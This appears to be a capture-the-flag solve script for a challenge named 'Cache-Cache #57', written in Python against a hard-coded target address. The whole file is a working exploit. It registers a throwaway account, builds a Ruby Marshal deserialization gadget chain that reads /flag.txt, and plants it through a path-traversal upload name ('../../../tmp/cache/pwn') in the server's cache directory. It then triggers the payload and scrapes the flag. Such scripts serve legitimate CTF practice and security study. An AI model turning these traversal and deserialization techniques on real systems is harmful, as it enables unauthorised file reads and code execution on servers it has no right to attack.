#!/usr/bin/env python3
"""Cache-Cache #57 — path traversal upload + Marshal gadget chain."""
import io
import os
import re
import subprocess
import sys
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://57.128.112.118:13964"
USER = f"ctf{__import__('random').randint(10000,99999)}"
PASS = "CachePwn123!"
CHALLENGE_ROOT = os.environ.get("CACHE_CACHE_SOURCE_DIR", "cache-cache")


def build_marshal_payload_ruby() -> bytes:
    ruby = r"""
require './lib/gadgets'

store = DataStore.new
locator = Locator.new
locator.store = store

formatter = Formatter.new
formatter.provider = locator
formatter.key = '/flag.txt'

buffer = OutputBuffer.new
buffer.processor = formatter

dispatcher = Dispatcher.new
dispatcher.target = buffer
dispatcher.tag = 'x'
dispatcher.plugins = []

node = DocumentNode.new
node.handler = dispatcher
node.payload = ''

$stdout.binmode
$stdout.write(Marshal.dump(node))
"""
    return subprocess.check_output(["ruby", "-e", ruby], cwd=CHALLENGE_ROOT)


def multipart(fields, files):
    boundary = "----CacheCacheBoundary"
    body = io.BytesIO()
    for name, val in fields.items():
        body.write(f"--{boundary}\r\n".encode())
        body.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode())
        body.write(f"{val}\r\n".encode())
    for name, (fname, data, ctype) in files.items():
        body.write(f"--{boundary}\r\n".encode())
        body.write(
            f'Content-Disposition: form-data; name="{name}"; filename="{fname}"\r\n'.encode()
        )
        body.write(f"Content-Type: {ctype}\r\n\r\n".encode())
        body.write(data)
        body.write(b"\r\n")
    body.write(f"--{boundary}--\r\n".encode())
    return boundary, body.getvalue()


def main():
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CookieJar()))

    # register + login
    for path, fields in [("/register", {"username": USER, "password": PASS}), ("/login", {"username": USER, "password": PASS})]:
        req = urllib.request.Request(
            f"{BASE}{path}",
            data=urllib.parse.urlencode(fields).encode(),
            method="POST",
        )
        op.open(req)

    payload = build_marshal_payload_ruby()
    print(f"[+] marshal payload {len(payload)} bytes", flush=True)

    # path traversal into /tmp/cache (CACHE_DIR)
    saveas = "../../../tmp/cache/pwn"
    b, data = multipart(
        {"saveas": saveas},
        {"avatar": ("x.bin", payload, "application/octet-stream")},
    )
    req = urllib.request.Request(
        f"{BASE}/profile/upload",
        data=data,
        method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={b}"},
    )
    op.open(req)

    html = op.open(f"{BASE}/report/pwn").read().decode()
    print("[+] report response snippet:", flush=True)
    print(html[:1500], flush=True)

    flags = re.findall(r"SHLK\{[^}]+\}", html)
    if flags:
        print(f"[FLAG] {flags[0]}", flush=True)
    else:
        # also try plain flag.txt content
        m = re.search(r"report-body[^>]*>.*?<p>([^<]+)", html, re.S)
        if m:
            print("[?] body:", m.group(1)[:200], flush=True)


if __name__ == "__main__":
    main()
